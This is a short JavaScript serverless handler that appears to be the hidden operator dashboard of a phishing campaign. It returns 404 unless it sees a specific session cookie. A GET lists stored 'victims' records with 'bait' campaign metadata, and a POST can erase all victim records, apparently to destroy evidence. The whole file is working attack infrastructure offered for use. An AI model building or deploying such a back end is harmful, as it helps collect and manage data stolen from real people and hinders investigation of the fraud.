const { kv } = require('@vercel/kv');

module.exports = async function handler(req, res) {
  const token = readToken(req);
  let valid = false;
  try {
    valid = token ? Boolean(await kv.get('sess:' + token)) : false;
  } catch (e) { valid = false; }

  if (!valid || !token) {
    return res.status(404).end();
  }

  if (req.method === 'GET') {
    let all = {};
    try {
      all = await kv.hgetall('victims') || {};
    } catch (e) { all = {}; }
    const list = Object.values(all).map(v => {
      try { return JSON.parse(v); } catch (e) { return v; }
    });
    list.sort((a, b) => String(b.t || '').localeCompare(String(a.t || '')));
    let bait = null;
    try {
      const raw = await kv.get('bait:meta');
      bait = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : null;
    } catch (e) { bait = null; }
    return res.status(200).json({ sessions: list, count: list.length, bait: bait });
  }

  if (req.method === 'POST') {
    const body = req.body || {};
    if (body.f === 1) {
      try { await kv.del('victims'); } catch (e) {}
      return res.status(200).json({ ok: 1 });
    }
    return res.status(404).end();
  }

  return res.status(404).end();
};

function readToken(req) {
  const c = req.headers.cookie || '';
  const m = c.match(/(?:^|;\s*)dxy_s=([a-f0-9]{48})/);
  return m ? m[1] : null;
}
